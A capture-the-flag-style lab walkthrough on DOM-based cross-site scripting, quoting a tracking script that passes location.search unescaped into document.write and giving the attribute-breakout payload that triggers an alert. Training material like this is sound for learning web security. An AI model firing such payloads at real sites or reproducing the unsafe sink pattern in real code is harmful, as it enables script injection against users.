# Lab: DOM XSS in document.write sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

***

We Have a Search Box Here And We Try To Inject Some Input and See The Response !!

<figure><img src="../../../.gitbook/assets/image (794).png" alt=""><figcaption></figcaption></figure>

After "nexxel" Search in The Search Box i analyse The Debuger Tab in Developers Tools and Got The Vulnerable Code !!<br>

```
<script>
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
</script>
```

<figure><img src="../../../.gitbook/assets/image (795).png" alt=""><figcaption></figcaption></figure>

Then I Craft The Payload and We Got POP Up !!

Break out of the `img` attribute by searching for:

```
?search="><script>alert(1)</script>
```

<figure><img src="../../../.gitbook/assets/image (796).png" alt=""><figcaption></figcaption></figure>

Lab Has Been Solved Succesfully !!

<figure><img src="../../../.gitbook/assets/image (797).png" alt=""><figcaption></figcaption></figure>
